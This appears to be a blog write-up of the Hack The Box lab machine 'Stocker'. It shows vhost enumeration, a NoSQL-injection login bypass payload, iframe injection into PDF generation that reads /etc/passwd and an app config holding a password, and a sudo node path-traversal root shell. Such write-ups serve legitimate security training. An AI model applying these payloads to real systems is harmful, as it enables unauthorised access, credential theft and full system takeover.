---
layout: post
title: Hack The Box - stocker
date: 2023-03-28 23:16 +0200
image:
  path: /assets/img/posts/stocker/stocker-card.png
  alt: Stocker card
categories: [HackTheBox]
tags: [Hack-The-Box-Easy]
---

```
HOST: 10.10.11.196
```

## Tools used

- [nmap](https://nmap.org/)
- [burpSuite](https://portswigger.net/)

## What to do ?

- First we'll scan port with `nmap` to discover if was some it open
- Then we'll find a loophole and exploit it.

## Nmap scan

```
rether> nmap -A 10.10.11.196
[...]
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-title: Stockers Sign-in
|_Requested resource was /login
|_http-generator: Hugo 0.84.0
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
[...]
```

> You can add the domain `stocker.htb` to the `/etc/hosts` file before scanning the http service with the following command (make sure you are root):

```bash
root> echo 10.10.11.196 stocker.htb >> /etc/hosts
```

{: .prompt-tip }

## HTTP - Port 80

I tried several times with `dirb` to find hidden files and folders, but without result.

Now we can trie to find sub domain with `gobuster`:

```bash
rether> gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb  -t 20 --append-domain
[...]
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
Progress: 4875 / 4990 (97.70%)
[...]
```

> Command explained :

- `vhost` : virtual host brute-forcing mode (not the same as DNS!)
- `-w` : Path to the wordlist
- `-u` : the target URL
- `-t` : number of concurrent threads (default 10)
- `--append-domain` : append main domain from URL to words from wordlist. Otherwise the fully qualified domains need to be specified in the wordlist.
  {: .prompt-info }

He found one sub domain `dev.stocker.htb`

We got a login panel

![Login panel](/assets/img/posts/stocker/stocker-login-panel.png "Login panel")

With `burpsuite` we see in the server response, the X-Powered-By header, which tells us that it is an express server. Express is a NodeJS package which means the database may be NoSQL. This allows you to attempt a NoSQL injection to bypass authentication.

![Request response](/assets/img/posts/stocker/stocker-login-request-response.png "Request response")

To try NoSQL injection, we need to change the header
`Content-Type` to `application/json` and the credentials to :

```json
{ "username": { "$ne": "admin" }, "password": { "$ne": "admin" } }
```

Something like this:

![NoSQL injection request](/assets/img/posts/stocker/stocker-nosql-injection-request.png "NoSQL injection request")

For more information and to find out how nosql injection works, see [nullsweep](https://nullsweep.com/nosql-injection-cheatsheet/)

![Stocker home panel](/assets/img/posts/stocker/stocker-home-panel.png "Stocker home panel")

We got a new page.

## Cross Site Scripting (XSS) - PDF

When you submit your purshase, this will generate pdf.
The request who generate the pdf contains some data:

```json
{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a8d",
      "title": "Cup",
      "description": "It's a red cup.",
      "image": "red-cup.jpg",
      "price": 32,
      "currentStock": 4,
      "__v": 0,
      "amount": 2
    }
  ]
}
```

When you change the content of the title tag by `<h1>Cup</h1>` and send it to the server, the pdf keeps the changes.
So let try to get content of a file like `/etc/passwd` to get the username for ssh connection.

```json
{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a8d",
      "title": "<iframe width=500 height=700 src=file:///etc/passwd></iframe>",
      "description": "It's a red cup.",
      "image": "red-cup.jpg",
      "price": 32,
      "currentStock": 4,
      "__v": 0,
      "amount": 2
    }
  ]
}
```

We got a pdf with the content of `/etc/passwd` file :

![Stocker XSS PDF /etc/passwd](/assets/img/posts/stocker/stocker-xss-pdf-etc-passwd.png "Stocker XSS PDF /etc/passwd")

```
[...]
angoose:x:1001:1001:,,,:/home/angoose:/bin/bash
[...]
```

Angoose user is the ssh username

To find the password to connect via ssh, we need to change the payload with the express server configuration file.
We are on the development site, so the path to the source code is often in `/var/www/dev/` and the server configuration may be in a `server.js` or `ìndex.js` file.

```json
{
  "basket": [
    {
      "_id": "638f116eeb060210cbd83a8d",
      "title": "<iframe width=500 height=700 src=file:///var/www/dev/index.js></iframe>",
      "description": "It's a red cup.",
      "image": "red-cup.jpg",
      "price": 32,
      "currentStock": 4,
      "__v": 0,
      "amount": 2
    }
  ]
}
```

![Stocker XSS PDF express configuration](/assets/img/posts/stocker/stocker-xss-pdf-express-configuration.png "Stocker XSS PDF express configuration")

We got the password for mongodb, we will try this one for the ssh connection

- username: `angoose`
- password: `IHeardPassphrasesArePrettySecure`

```bash
rether> ssh angoose@10.10.11.196
angoose@10.10.11.196's password:

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

angoose@stocker:~$
```

## Get user flag

```bash
rether> cat user.txt
[user-flag]
```

## Get root flag

To get the root flag, you must first know what commands are allowed to the user angoose.

```bash
angoose@stocker:~$ sudo -l
[sudo] password for angoose:
Matching Defaults entries for angoose on stocker:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User angoose may run the following commands on stocker:
    (ALL) /usr/bin/node /usr/local/scripts/*.js
```

We can execute node with root privilege comes from the javascript files provent to `/usr/local/scripts/`.

So, to create a malicious program, we simply add a new javascript file to the `/usr/local/scripts/` folder, but we do not have permission to create files there.

Create file:

```bash
nano /home/angoose/shell.js
```

As the name of the file we have created says, we will create a shell and run it with root privileges.
Add this line in the `shell.js` file.

```js
const childProcess = require("child_process").spawn("/usr/bin/bash", {
  stdio: [0, 1, 2, "ipc"]
});
```

Execute file with the following command:

```bash
sudo /usr/bin/node /usr/local/scripts/../../../../home/angoose/shell.js
```

And obtain a root shell

```bash
angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../../home/angoose/shell.js
[sudo] password for angoose:
root@stocker:/home/angoose# whoami
root
```

Get the root flag in the default path to the root directory

```bash
root@stocker:/home/angoose# cd
root@stocker:~# cat root.txt
[root-flag]
```

![Card of pwned stocker](/assets/img/posts/stocker/stocker-pwned.png){: width="972" height="589" }
